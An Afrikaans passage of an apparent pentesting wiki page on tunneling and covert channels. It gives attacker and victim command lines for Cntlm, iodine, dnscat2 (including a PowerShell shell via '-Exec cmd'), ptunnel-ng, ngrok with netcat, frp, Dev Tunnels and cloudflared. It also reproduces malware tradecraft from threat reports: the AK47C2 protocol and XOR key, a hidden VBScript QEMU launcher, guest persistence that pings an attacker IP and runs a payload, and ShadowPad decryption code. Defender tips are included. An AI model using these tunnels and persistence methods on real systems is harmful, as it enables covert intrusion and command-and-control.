Die voorheen genoemde hulpmiddel, **Rpivot**, kan verkeer deur ’n NTLM-verifikasieproxy aflos. **OpenVPN** kan ook verkeer deur so ’n proxy stuur wanneer dit met ’n auth-lêer en die NTLMv2-metode opgestel is; dit is proxy traversal, nie ’n omseiling van proxy-verifikasie nie.<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm verifieer by stroomop-NTLM-proxy’s, stel plaaslike luisterpoorte beskikbaar en kan ’n plaaslike tonnelpoort aan ’n bestemmingdiens koppel; kliënte kan dan daardie plaaslike poort gebruik.<sup>[[29]](#references)</sup>\
Byvoorbeeld, stuur poort 443 aan.

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

Nou, as jy byvoorbeeld op die slagoffer die **SSH**-diens instel om op poort 443 te luister, kan jy daaraan koppel via die aanvaller se poort 2222.<sup>[[29]](#references)</sup>\
Jy kan ook ’n **meterpreter** gebruik wat aan localhost:443 koppel terwyl die aanvaller op poort 2222 luister.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) is Microsoft se .NET reverse-proxy toolkit. Jy kan dit hier vind: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine skep ’n IPv4-tonnel deur DNS-navrae en gebruik TUN-koppelvlakke; die gedokumenteerde opstelling vereis die nodige voorregte om dié koppelvlakke aan albei kante te skep.<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

DNS-vervoer het meer oorhoofse koste as direkte TCP en is gewoonlik stadig; jy kan ’n saamgeperste SSH-verbinding deur hierdie tonnel skep deur die volgende te gebruik:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**Laai dit hier af**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 vestig ’n geënkripteerde command-and-control-kanaal deur DNS; die server- en client-opdragte hieronder volg die gedokumenteerde gebruik daarvan.<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **In PowerShell**

Jy kan [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) gebruik om ’n dnscat2-kliënt in PowerShell te laat loop; die README dokumenteer die `Start-Dnscat2`-parameters wat hieronder gewys word.<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **Port forwarding met dnscat**

Dnscat2 se interaktiewe `listen`-opdrag koppel ’n plaaslike luisteraar aan ’n afgeleë gasheer en poort.<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Verander proxychains-DNS

Proxychains-ng haak by dinamies gekoppelde TCP-verbindings in en kan nie UDP of ICMP dra nie; DNS-proksiering is konfigureerbaar, dus inspekteer die geïnstalleerde `proxychains.conf` en resolver-helper eerder as om ’n vaste openbare resolver te aanvaar. Verouderde `proxyresolv`-skripte stel `PROXY_DNS_SERVER` beskikbaar om die resolver te kies; gebruik ’n resolver wat vanaf die pivot bereikbaar is wanneer interne name benodig word.<sup>[[34]](#references)[[35]](#references)</sup>

## Tonnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Pasgemaakte DNS TXT / HTTP JSON C2 (AK47C2)

Die Storm-2603-akteur het ’n **dubbelkanaal-C2 ("AK47C2")** geskep wat *slegs* uitgaande **DNS**- en **gewone HTTP POST**-verkeer misbruik – twee protokolle wat selde op korporatiewe netwerke geblokkeer word.<sup>[[2]](#references)</sup>

1. **DNS-modus (AK47DNS)**
   • Genereer ’n ewekansige SessionID van 5 karakters (bv. `H4T14`).  
   • Voeg `1` vooraan vir *taakversoeke* of `2` vir *resultate* en voeg verskillende velde saam (vlae, SessionID, rekenaarnaam).  
   • Elke veld word **met die ASCII-sleutel `VHBD@H` XOR-geënkripteer**, hekskodeer en met punte aan mekaar gekoppel – en eindig uiteindelik met die domein onder die aanvaller se beheer:

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • Versoeke gebruik `DnsQuery()` vir **TXT** (en terugval-**MG**) rekords.  
   • Wanneer die antwoord 0xFF grepe oorskry, **fragmenteer** die backdoor die data in stukke van 63 grepe en voeg die merkers in:
     `s<SessionID>t<TOTAL>p<POS>` sodat die C2-bediener hulle kan herorden.

2. **HTTP-modus (AK47HTTP)**
   • Bou ’n JSON-koevert:
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • Die hele blob word met XOR-`VHBD@H` geënkripteer → na hex omgeskakel → as die liggaam van ’n **`POST /`** gestuur met die header `Content-Type: text/plain`.
   • Die antwoord gebruik dieselfde enkodering, en die `cmd`-veld word uitgevoer met `cmd.exe /c <command> 2>&1`.

Blue Team-notas
• Soek na ongewone **TXT-navrae** waarvan die eerste label lang heksadesimale teks bevat en wat altyd op een seldsame domein eindig.
• ’n Konstante XOR-sleutel gevolg deur ASCII-hex is maklik om met YARA op te spoor: `6?56484244?484` (`VHBD@H` in hex).
• Vir HTTP, merk `text/plain` POST-liggame wat net uit hex bestaan en ’n veelvoud van twee grepe lank is.

{{#note}}
Die kanaal hou elke subdomeinlabel binne die DNS-limiet van 63 oktette, maar protokolnakoming alleen maak dit nie onopvallend nie; seldsame domeine, lang heksadesimale labels en navraagvolume bly opsporingseine.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans dokumenteer ’n IPv4-oor-ICMP-tonnel wat ’n TUN-toestel en ICMP-echo-versoeke gebruik; die opstelling vereis voldoende voorregte om die koppelvlak te skep.<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Laai dit hier af**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng vervoer TCP-verbindings oor ICMP en gebruik die `-p`, `-l`, `-r` en `-R`-opsies hieronder vir die proxy, plaaslike luisteraar, bestemmingsgasheer en bestemmingspoort.<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) is 'n agent om plaaslike netwerkdienste deur 'n veilige tonnel aanlyn beskikbaar te stel; sy CLI dokumenteer HTTP-, TCP- en lêer-URL-eindpunte, en die afgedrukte eindpuntgasheernaam kan volgens eindpunt en rekening verskil.<sup>[[39]](#references)</sup>

### Installasie

- Skep 'n rekening: https://ngrok.com/signup
- Kliëntaflaai:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### Basiese gebruike

**Dokumentasie:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Die agent ondersteun ook verifikasie- en TLS-opsies wanneer nodig.<sup>[[39]](#references)</sup>_

#### Tunneling TCP

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### Lêers met HTTP blootstel

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### Sniffing van HTTP-oproepe

_Nuttig vir XSS,SSRF,SSTI ..._\
Die selfstandige agent stel sy HTTP-inspeksiekoppelvlak by verstek beskikbaar by `http://127.0.0.1:4040`; die koppelvlak is vir HTTP-verkeer.<sup>[[40]](#references)</sup>

#### Tunneling van interne HTTP-diens

Die `--host-header=rewrite`-opsie herskryf die stroomop-HTTP-`Host`-opskrif sodat dit by die plaaslike diens pas.<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### ngrok.yaml eenvoudige konfigurasievoorbeeld

Dit gebruik ngrok Agent Config v2; benoemde tunnels gebruik `proto` en `addr` en word met `ngrok start` begin.<sup>[[42]](#references)</sup> Dit maak 3 tunnels oop:

- 2 TCP
- 1 HTTP met statiese lêers wat vanaf /tmp/httpbin/ bedien word.

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Microsoft Dev Tunnels kan ’n plaaslike TCP-gebaseerde diens deur Microsoft se aflosinfrastruktuur publiseer. Die gasheer-CLI skep ’n uitgaande tonnel, terwyl `devtunnel connect` die gehuisveste poort op die kliënt herskep; tonnels vereis by verstek verifikasie, tensy toegangskontroles doelbewus verslap word.<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

Dit kan RDP via `*.devtunnels.ms` blootstel sonder om ’n nuwe inkomende luisteraar op die perimeter oop te maak. Dit kan ook saam met ’n RDP-virtuelekanaaltonnel soos `rdp2tcp` gebruik word, wat die RDP-sessie in ’n tweede-fase-pivot vir arbitrêre TCP-verkeer omskep.<sup>[[58]](#references)</sup>

Om dit op te spoor, korreleer die uitvoering van die Dev Tunnels CLI met DNS/TLS-verkeer na `*.devtunnels.ms` en onverwagte RDP-virtuelekanaalgebeurtenisse. ’n Geënkripteerde tonnel is nie onskadelik bloot omdat dit ’n Microsoft-besitte aflosbediener gebruik nie.<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Cloudflare Tunnel se `cloudflared`-koppelaar bewerkstellig uitgaande verbindings; gepubliseerde toepassings kan HTTP, HTTPS, TCP, SSH en RDP roeteer, terwyl vinnige tonnels bedoel is vir HTTP-ontwikkeling.<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel-eenreëlopdrag

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### SOCKS5-origin (verouderde modus)

Die verouderde `--socks5`-vlag vertel `cloudflared` dat die plaaslike origin SOCKS5 praat; dit skep nie ’n plaaslike SOCKS5-listener nie. Vir ’n managed tunnel stel `originRequest.proxyType: socks` SOCKS5-originhantering op.<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### Volgehoue tonnels met DNS

Lokaal bestuurde tunnelkonfigurasie gebruik die sleutels `tunnel`, `credentials-file` en `url` in kleinletters, soos hieronder getoon.<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

Begin die koppelaar:

```bash
cloudflared tunnel run mytunnel
```

Die connector vestig uitgaande verbindings en onderhandel by verstek oor QUIC, met terugval na HTTP/2; moenie aanvaar dat elke ontplooiing TCP/443 gebruik nie. Laat dit loop met slegs die voorregte wat jou ontplooiing vereis.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) is ’n Go reverse proxy wat **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX en XTCP** ondersteun. XTCP gebruik P2P hole punching, waarvan die sukses van NAT afhang. Vanaf **v0.53.0** kan dit as ’n **SSH Tunnel Gateway** optree, sodat ’n teiken-gasheer die standaard OpenSSH-kliënt kan gebruik sonder ’n `frpc`-binêre lêer.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Klassieke reverse TCP-tonnel

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### Gebruik van die nuwe SSH-gateway (geen frpc-binary nie)

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

Die bogenoemde opdrag publiseer die slagoffer se poort **8080** as **attacker_ip:9000** met die standaard OpenSSH-kliënt, terwyl `frps` die gateway verskaf.<sup>[[50]](#references)</sup>

## STUN-gesteunde UDP-back-connects

STUN Binding-versoeke wat vanaf ’n UDP-sok gestuur word, kan die sok se server-reflexive IP-adres en poort openbaar, terwyl periodieke verkeer die NAT-binding lewendig hou. ’n Openbare STUN-bediener is nie ’n aflos vir arbitrêre beheerpakette nie.<sup>[[60]](#references)</sup> ’n Ontwerp vir back-connects wat ontleed is, het dieselfde UDP-sok vir ’n kort beheer-datagram behou en daarna ’n *afsonderlike uitgaande TCP-verbinding* gebruik om opdragte te gaan haal en uit te voer nadat die sneller ontvang is.<sup>[[59]](#references)</sup>

Om die beheerder se UDP-pakket te ontvang, moet ’n ontwerp steeds die kartering met daardie beheerder deel en aan die NAT se filterbeleid voldoen. Adres- of poortafhanklike filtering kan antwoorde van die STUN-bediener aanvaar, maar pakette van ’n ander eindpunt laat val.<sup>[[60]](#references)[[61]](#references)</sup> Die rendezvous-pad van die ontlede backdoor is nie geverifieer nie, dus bewys suksesvolle STUN-antwoorde alleen nie dat die beheerkanaal bereikbaar is nie.<sup>[[59]](#references)</sup> Vir ’n afsonderlike protokol met eksplisiete rendezvous en ’n aflos-terugvalopsie, sien [PPPP camera NAT traversal](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport).

## Verbloemde VM-gebaseerde tonnels met QEMU

QEMU-gebruikersmodenetwerk vereis nie root- of administrateurregte vir die virtuele netwerk nie, en `-netdev user,hostfwd=...` herlei TCP-, UDP- of UNIX-verbindings vanaf die gasheer na die gas.<sup>[[51]](#references)</sup> TrustedSec het ’n Tiny Core QEMU-VM en ’n poging tot ’n omgekeerde SSH-tonnel gedokumenteer in ’n voorval waar EDR wat op die gasheer fokus, aktiwiteit binne die gas kon miskyk.<sup>[[1]](#references)</sup>

### Vinnige eenreël-opdrag

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• Die opdrag hierbo begin ’n **Tiny Core Linux**-gasstelsel met 256 MiB gasgeheue en ’n qcow2-skyfbeeld; die skyfbeeld is nie ’n skyf in RAM nie.
• Poort **2222/tcp** op die Windows-gasheer word deursigtig aangestuur na **22/tcp** binne die gasstelsel.  
• Vanuit die aanvaller se oogpunt stel die teiken eenvoudig poort 2222 bloot; enige pakkette wat dit bereik, word deur die SSH-bediener in die VM hanteer.

### Stealthy lansering deur VBScript

TrustedSec het VBS-gedrewe QEMU-lanserings en Tiny Core-beelde waargeneem in die voorval waarna hierbo verwys word.<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

Running the script met `cscript.exe //B update.vbs` hou die venster versteek.<sup>[[1]](#references)</sup>

### Persistence in die guest

Die aangehaalde voorval beskryf persistence in die staatlose Tiny Core-guest deur middel van `/opt/bootlocal.sh` en `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Plaas payload in `/opt/123.out`  
2. Voeg by `/opt/bootlocal.sh`:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. Voeg `home/tc` en `opt` by `/opt/filetool.lst` sodat die payload met afskakeling in `mydata.tgz` verpak word.

### Telemetrie-oorwegings

• Die gasheer stel steeds die QEMU-proses, qcow2-beeld en enige luisteraar wat deur die gasheer aangestuur word, bloot.  
• Skanderings van prosesse wat net op die gasheer fokus, ondersoek dalk nie gasprosesse nie, maar virtualisering waarborg nie ontduiking nie; netwerk-, QEMU- en beeldtelemetrie kan dit steeds blootlê.<sup>[[1]](#references)[[51]](#references)</sup>

### Wenke vir verdedigers

• Stel waarskuwings in vir **onverwagte QEMU/VirtualBox/KVM-binêre lêers** in paaie waar gebruikers kan skryf.  
• Blokkeer uitgaande verbindings wat vanaf `qemu-system*.exe` ontstaan.  
• Soek na seldsame luisterpoorte (2222, 10022, …) wat onmiddellik ná ’n QEMU-bekendstelling begin luister.

## IIS/HTTP.sys-aflosnodusse via `HttpAddUrl` (ShadowPad)

Check Point beskryf ShadowPad se IIS-module as ’n manier om gekompromitteerde randwebbedieners in agterdeur- en aflosnodusse te omskep deur URL-voorvoegsels via `HttpAddUrl` te bind.<sup>[[3]](#references)</sup>

Dieselfde verslag bespreek die verstekwaardes, jokertekenluisteraars, pakkiedekripsie, aflosrye en ontfoutings-telemetrie wat hieronder opgesom word.<sup>[[3]](#references)</sup>

* **Verstekwaardes vir konfigurasie** – indien die module se JSON-konfigurasie waardes weglaat, gebruik dit geloofwaardige IIS-verstekwaardes (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Só beantwoord IIS onskuldige verkeer met die korrekte handelsmerk.
* **Jokerteken-onderskepping** – operateurs verskaf ’n puntkomma-geskeide lys URL-voorvoegsels (jokertekens in die gasheernaam en pad). Die module roep `HttpAddUrl` vir elke inskrywing aan, sodat HTTP.sys versoeke wat ooreenstem na die kwaadwillige hanteerder stuur; versoeke wat nie ooreenstem nie, val terug op normale IIS-gedrag.
* **Geënkripteerde eerste pakkie** – die eerste twee grepe van die versoekliggaam bevat die saad vir ’n pasgemaakte 32-bis PRNG. Elke daaropvolgende greep word met die gegenereerde sleutestroom XOR voordat protokolontleding begin:

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Relay-orkestrasie** – die module hou twee lyste by: “servers” (stroomopwaartse nodusse) en “clients” (afstroomwaartse implants). Inskrywings word verwyder as daar nie binne ongeveer 30 sekondes ’n heartbeat aankom nie. Wanneer albei lyste nie leeg is nie, koppel dit die eerste gesonde server aan die eerste gesonde client en stuur eenvoudig grepe tussen hul sockets aan totdat een kant sluit.
* **Debug-telemetrie** – opsionele logging teken die bron-IP, bestemmings-IP en totale aantal aangestuurde grepe vir elke koppeling aan. Ondersoekers het daardie spore gebruik om die ShadowPad-mesh oor verskeie slagoffers heen te rekonstrueer.

---

## Ander nutsmiddels om na te gaan

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Skuil in die skaduwees: Versteekte tonnels via QEMU-virtualisering](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Voor ToolShell: Verkenning van Storm-2603 se vorige ransomware-bedrywighede](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Binne Ink Dragon: Onthulling van die relay-netwerk en innerlike werking van ’n geheimsinnige offensiewe operasie](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap-verwysingsgids: Omseil firewall-/IDS-beperkings](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD ssh-handleiding](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_config-handleiding](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6-vrystellingsnotas](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting in Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit socks_proxy-moduledokumentasie](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit autoroute-moduledokumentasie](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS-proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Omgekeerde poortaanstuur](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng-vinnigbegin](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng-luisteraars](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat-handleiding](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plink-handleiding](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY-opdragreëlopsies](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy-opdrag](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier-dokumentasie](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier-proksifikasiereëls](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7-handleiding](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Domeinname – Implementering en spesifikasie](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok-webinspeksiekoppelvlak](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok-virtuele gashere](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Oorsig van Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnel-oorsprongparameters](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnel-opstelling](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnel-konfigurasielêer](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnel-loopparameters](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp-konsepte](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU-netwerkdokumentasie](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [NetSPI BOFScale-bronkodebewaarplek](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: ’n CDN-voorkant-tailnet vanaf ’n BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn - Dev Tunnels CLI-opdragte](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [NightEagle APT: GhostContainer en tunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
- [59] [FortiGuard Labs - ClingSTUN Linux-backdoor misbruik openbare STUN-infrastruktuur](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
- [60] [RFC 8489 - Session Traversal Utilities for NAT (STUN)](https://www.rfc-editor.org/rfc/rfc8489.html)
- [61] [RFC 4787 - NAT-gedragsvereistes vir unicast UDP](https://www.rfc-editor.org/rfc/rfc4787.html)
{{#include ../banners/hacktricks-training.md}}
